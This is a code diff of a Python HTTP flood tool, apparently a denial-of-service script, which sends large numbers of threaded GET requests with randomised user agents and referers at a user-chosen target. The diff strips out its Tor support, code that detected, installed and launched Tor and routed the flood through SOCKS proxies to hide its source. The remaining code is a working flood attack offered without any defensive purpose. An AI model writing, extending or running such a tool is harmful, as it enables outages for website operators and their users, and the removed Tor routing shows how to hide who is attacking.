@@ -32,7 +32,6 @@ except ImportError:
     msvcrt = None
 
 STOP_EVENT = threading.Event()
-TOR_PROCESS = None
 
 
 def banner():
@@ -78,177 +77,20 @@ def listen_for_end():
                 if special == b'O':
                     STOP_EVENT.set()
                     print(Fore.RED + Style.BRIGHT + "\nEND key pressed: stopping attack..." + Style.RESET_ALL)
-                    time.sleep(2)
+                    time.sleep(1)
                     sys.exit()
-
-
-def is_tor_ready(host='127.0.0.1', ports=[9050, 9150, 8118], timeout=2):
-    """Check if Tor SOCKS5 proxy is ready and listening on any common port"""
-    if isinstance(ports, int):
-        ports = [ports]
-    
-    for port in ports:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(timeout)
-            result = sock.connect_ex((host, port))
-            sock.close()
-            if result == 0:
-                return True
-        except Exception:
-            continue
-    return False
-
-
-def install_tor():
-    """Attempt to install Tor using Chocolatey"""
-    try:
-        print(Fore.YELLOW + "[*] Attempting to install Tor via Chocolatey..." + Style.RESET_ALL)
-        
-        # Check if choco is available
-        subprocess.run(['choco', '--version'], capture_output=True, check=True)
-        
-        # Install Tor
-        result = subprocess.run(
-            ['choco', 'install', 'tor', '-y'],
-            capture_output=True,
-            text=True
-        )
-        
-        if result.returncode == 0:
-            print(Fore.GREEN + "[+] Tor installed successfully!" + Style.RESET_ALL)
-            return True
-        else:
-            print(Fore.RED + "[-] Failed to install Tor via Chocolatey" + Style.RESET_ALL)
-            time.sleep(2)
-            continue_choice = input(Fore.GREEN + Style.BRIGHT + "Continue attack without Tor? (y/n): " + Style.RESET_ALL).strip().lower()
-            if continue_choice != 'y':
-                print(Fore.YELLOW + "[*] Exiting..." + Style.RESET_ALL)
-                sys.exit()
-            else:
-                return False
-            
-    except FileNotFoundError:
-        print(Fore.RED + "[-] Chocolatey is not installed." + Style.RESET_ALL)
-        print(Fore.YELLOW + "[*] Install Chocolatey from https://chocolatey.org/install" + Style.RESET_ALL)
-        print(Fore.YELLOW + "[*] Or download Tor from https://www.torproject.org/download/" + Style.RESET_ALL)
-        continue_choice = input(Fore.GREEN + Style.BRIGHT + "Continue attack without Tor? (y/n): " + Style.RESET_ALL).strip().lower()
-        if continue_choice != 'y':
-            print(Fore.YELLOW + "[*] Exiting..." + Style.RESET_ALL)
-            sys.exit()
-        else:
-            return False
-        
-    except Exception as e:
-        print(Fore.RED + f"[-] Error installing Tor: {str(e)}" + Style.RESET_ALL)
-        continue_choice = input(Fore.GREEN + Style.BRIGHT + "Continue attack without Tor? (y/n): " + Style.RESET_ALL).strip().lower()
-        if continue_choice != 'y':
-            print(Fore.YELLOW + "[*] Exiting..." + Style.RESET_ALL)
-            sys.exit()
-        else:
-            return False
-
-
-def start_tor():
-    """Start Tor process with SOCKS5 proxy configuration or detect existing Tor"""
-    
-    # First, check if Tor is already running
-    print(Fore.YELLOW + "[*] Checking for running Tor instance..." + Style.RESET_ALL)
-    if is_tor_ready():
-        print(Fore.GREEN + "[+] Tor is already running and ready!" + Style.RESET_ALL)
-        return "success"
-    
-    try:
-        print(Fore.YELLOW + "[*] Launching Tor..." + Style.RESET_ALL)
-        
-        # Create Tor configuration
-        tor_config = """SocksPort 9050
-ControlPort 9051
-Log notice stdout
-RunAsDaemon 0
-"""
-        
-        # Write config to temp file
-        config_path = os.path.join(os.path.expanduser('~'), '.tor_config')
-        with open(config_path, 'w') as f:
-            f.write(tor_config)
-        
-        # Start Tor process
-        TOR_PROCESS = subprocess.Popen(
-            ['tor', '-f', config_path],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-            creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
-        )
-        
-        # Wait for Tor to be ready
-        print(Fore.YELLOW + "[*] Waiting for Tor to initialize..." + Style.RESET_ALL)
-        wait_time = 0
-        max_wait = 30
-        
-        while wait_time < max_wait:
-            if is_tor_ready():
-                print(Fore.GREEN + "[+] Tor is ready on 127.0.0.1:9050" + Style.RESET_ALL)
-                return "success"
-            time.sleep(1)
-            wait_time += 1
-            print(Fore.YELLOW + f"[*] Connecting to Tor... ({wait_time}/{max_wait}s)" + Style.RESET_ALL)
-        
-        print(Fore.RED + "[-] Tor failed to initialize within timeout" + Style.RESET_ALL)
-        return "timeout"
-        
-    except FileNotFoundError:
-        return "not_installed"
-    except Exception as e:
-        print(Fore.RED + f"[-] Error starting Tor: {str(e)}" + Style.RESET_ALL)
-        return "error"
-
-
-def stop_tor():
-    """Stop Tor process"""
-    
-    if TOR_PROCESS:
-        try:
-            TOR_PROCESS.terminate()
-            TOR_PROCESS.wait(timeout=5)
-            print(Fore.YELLOW + "[*] Tor stopped" + Style.RESET_ALL)
-        except Exception as e:
-            print(Fore.RED + f"[-] Error stopping Tor: {str(e)}" + Style.RESET_ALL)
-            try:
-                TOR_PROCESS.kill()
-            except:
-                pass
-        finally:
-            TOR_PROCESS = None
-
 
 def send_request(session, target, headers, timeout=5, use_tor=False):
     try:
-        if use_tor:
-            # Try to route through Tor SOCKS5 proxy on common ports
-            proxies = {
-                'http': 'socks5://127.0.0.1:9050',
-                'https': 'socks5://127.0.0.1:9050'
-            }
-            try:
-                response = session.get(target, headers=headers, timeout=timeout, proxies=proxies)
-            except Exception:
-                # Fallback to port 9150 (Tor Browser default)
-                proxies = {
-                    'http': 'socks5://127.0.0.1:9150',
-                    'https': 'socks5://127.0.0.1:9150'
-                }
-                response = session.get(target, headers=headers, timeout=timeout, proxies=proxies)
-        else:
-            response = session.get(target, headers=headers, timeout=timeout)
+        response = session.get(target, headers=headers, timeout=timeout)
         return response.status_code
     except requests.RequestException:
         return None
 
 
-def attack_target(target, useragents, referers, count, threads, use_tor=False):
-    tor_status = " (via Tor)" if use_tor else ""
-    print(Fore.GREEN + Style.BRIGHT + f"Starting attack: {count} requests to {target}{tor_status}" + Style.RESET_ALL)
+def attack_target(target, useragents, referers, count, threads):
+    
+    print(Fore.GREEN + Style.BRIGHT + f"Starting attack: {count} requests to {target}" + Style.RESET_ALL)
     print(Fore.YELLOW + "Press END to stop the program at any time." + Style.RESET_ALL)
 
     with requests.Session() as session:
@@ -261,7 +103,7 @@ def attack_target(target, useragents, referers, count, threads, use_tor=False):
                     break
 
                 headers = build_headers(useragents, referers)
-                future = executor.submit(send_request, session, target, headers, 5, use_tor)
+                future = executor.submit(send_request, session, target, headers, 5)
                 futures.append((attempt, headers, future))
 
             for attempt, headers, future in futures:
@@ -300,34 +142,6 @@ def main():
         threads = int(input(Fore.GREEN + Style.BRIGHT + "Concurrency threads (default 20): " + Style.RESET_ALL).strip())
     except ValueError:
         threads = 20
-
-    use_tor = input(Fore.GREEN + Style.BRIGHT + "Use Tor? (y/n, default n): " + Style.RESET_ALL).strip().lower() == 'y'
-    
-    if use_tor:
-        result = start_tor()
-        
-        if result == "not_installed":
-            print(Fore.RED + "[-] Tor is not installed" + Style.RESET_ALL)
-            install_choice = input(Fore.GREEN + Style.BRIGHT + "Install Tor? (y/n): " + Style.RESET_ALL).strip().lower()
-            
-            if install_choice == 'y':
-                if install_tor():
-                    result = start_tor()
-                    if result != "success":
-                        use_tor = False
-                else:
-                    use_tor = False
-            else:
-                continue_choice = input(Fore.GREEN + Style.BRIGHT + "Continue attack without Tor? (y/n): " + Style.RESET_ALL).strip().lower()
-                if continue_choice != 'y':
-                    print(Fore.YELLOW + "[*] Exiting..." + Style.RESET_ALL)
-                    sys.exit()
-                else:
-                    use_tor = False
-        
-        elif result != "success":
-            print(Fore.YELLOW + "[*] Failed to start Tor, continuing without it..." + Style.RESET_ALL)
-            use_tor = False
     
 
     useragents = get_useragents()
@@ -337,10 +151,8 @@ def main():
     listener.start()
     
     try:
-        attack_target(target, useragents, referers, count, threads, use_tor)
+        attack_target(target, useragents, referers, count, threads)
     finally:
-        if use_tor:
-            stop_tor()
         exit_msg = input(Fore.YELLOW + Style.BRIGHT + "Press Enter to exit..." + Style.RESET_ALL)
         sys.exit()
 
